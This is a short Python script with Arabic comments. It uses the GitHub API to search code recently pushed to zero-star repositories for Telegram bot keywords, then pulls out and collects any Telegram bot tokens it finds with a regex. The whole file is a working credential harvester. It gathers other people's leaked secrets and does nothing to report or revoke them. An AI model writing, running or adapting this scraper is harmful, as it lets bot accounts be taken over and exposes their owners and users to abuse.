import re
import os
import datetime
from github import Github

def search_for_tokens():
    # جلب التوكن الخاص بـ GitHub
    token = os.getenv('GITHUB_TOKEN')
    if not token:
        return []
        
    g = Github(token)
    found_tokens = []
    
    # تحديد النطاق الزمني (آخر 3 ساعات)
    three_hours_ago = (datetime.datetime.utcnow() - datetime.timedelta(hours=3)).isoformat()
    
    # استعلامات البحث (التركيز على المستودعات الجديدة والخاملة)
    queries = [
        f'bot_token pushed:>{three_hours_ago} stars:0',
        f'telebot pushed:>{three_hours_ago} stars:0',
        f'telegram_token pushed:>{three_hours_ago} stars:0'
    ]
    
    for query in queries:
        try:
            # البحث مع الترتيب حسب الأحدث
            results = g.search_code(query=query, sort='indexed', order='desc')
            
            # جلب أفضل 10 نتائج
            for file in results[:10]:
                try:
                    content = file.decoded_content.decode('utf-8')
                    # البحث عن توكن تليجرام باستخدام Regex
                    matches = re.findall(r'[0-9]{8,15}:[a-zA-Z0-9_-]{35}', content)
                    for token in matches:
                        if token not in found_tokens:
                            found_tokens.append(token)
                except:
                    continue
        except Exception:
            continue
            
    return found_tokens
